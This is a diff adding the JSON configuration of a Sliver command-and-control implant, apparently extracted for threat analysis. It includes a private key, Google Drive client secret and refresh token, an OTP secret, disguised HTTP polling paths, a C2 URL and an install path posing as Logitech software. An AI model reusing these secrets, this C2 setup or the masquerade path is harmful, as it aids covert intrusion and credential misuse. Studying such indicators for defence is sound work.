@@ -1,0 +1,53 @@
+{
+    "ServerPublicKey": "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl",
+    "PeerPublicKey": "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken",
+    "PeerPrivateKey": "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7",
+    "ServerMinisignPublicKey": "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2",
+    "SliverName": "DECISIVE_FERRY",
+    "ConfigID": "9ecd4772-22ed-428d-be07-a2579092f740",
+    "PeerAgePublicKeySignature": "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==",
+    "EncoderNonce": 13,
+    "MaxFailure": 5,
+    "ReconnectInterval": 600,
+    "SliverPath": "%APPDATA%\\Logitech",
+    "Protocol": 0,
+    "Type": 0,
+    "DriveConfigs": [
+        {
+            "ClientID": "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com",
+            "ClientSecret": "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",
+            "RefreshToken": "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig",
+            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36",
+            "StartExtension": "coffee",
+            "SendExtension": "vsx",
+            "RecvExtension": "_sln160",
+            "RegisterExtension": "vssettings",
+            "PollInterval": 120
+        }
+    ],
+    "HttpConfigs": [
+        {
+            "PollPaths": ["script", "javascripts", "javascript", "jscript", "js", "umd"],
+            "PollFiles": ["jquery", "route", "app"],
+            "SessionPaths": ["upload", "actions"],
+            "SessionFiles": ["samples", "api"],
+            "ClosePaths": ["assets", "images"],
+            "CloseFiles": ["example", "favicon"],
+            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36",
+            "OtpSecret": "GQH4RBUBSOLX446N2CBCS7AYHYLBMA2A",
+            "OtpInterval": 30,
+            "MinNumberOfSegments": 2,
+            "MaxNumberOfSegments": 4,
+            "PollInterval": 3,
+            "UseStandardPort": true,
+            "URL": "http://ubuntu-icefrog2000.com"
+        }
+    ],
+    "PivotConfigs": [
+        {
+            "BindAddress": "127.0.0.1:9898",
+            "ReadDeadline": 10,
+            "WriteDeadline": 10
+        }
+    ]
+}
